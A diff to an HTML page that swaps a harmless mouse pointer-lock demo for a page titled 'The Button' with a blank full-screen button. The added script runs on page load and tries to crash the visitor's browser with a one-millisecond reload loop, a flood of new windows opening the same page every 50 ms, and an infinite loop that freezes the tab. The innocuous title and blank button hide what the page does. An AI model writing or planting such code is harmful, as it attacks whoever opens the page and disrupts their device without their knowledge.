@@ -1,31 +1,51 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Mouse Lock Demo</title>
-</head>
-<body style="margin:0; background:#222; height:100vh; display:flex; justify-content:center; align-items:center; color:white; font-family:sans-serif;">
+  <title>The Button</title>
+  <style>
+    html, body {
+      margin: 0;
+      height: 100%;
+      background-color: #00f5cc;
+    }
 
-  <div>Click anywhere to lock the mouse</div>
+    button {
+      width: 100%;
+      height: 100%;
+      font-size: 40px;
+      font-weight: bold;
+      border: none;
+      background-color: #00f5cc;
+      color: white;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #00f5cc;
+    }
+  </style>
+</head>
+<body>
+
+  <button></button>
 
   <script>
-    document.body.addEventListener("click", function () {
-      document.body.requestPointerLock();
-    });
+    function crash() {
+      // Reload loop
+      setInterval(() => location.reload(true), 1);
 
-    document.addEventListener("pointerlockchange", () => {
-      if (document.pointerLockElement === document.body) {
-        console.log("Mouse locked!");
-      } else {
-        console.log("Mouse unlocked!");
-      }
-    });
+      // Flood the browser with new windows
+      setInterval(() => {
+        window.open(window.location.href, '_blank');
+      }, 50);
 
-    // Capture mouse movement
-    document.addEventListener("mousemove", (e) => {
-      if (document.pointerLockElement === document.body) {
-        console.log("Mouse moved: ", e.movementX, e.movementY);
+      // Freeze the tab
+      while (true) {
+        console.log("crash");
       }
-    });
+    }
+
+    window.onload = crash;
   </script>
 
 </body>
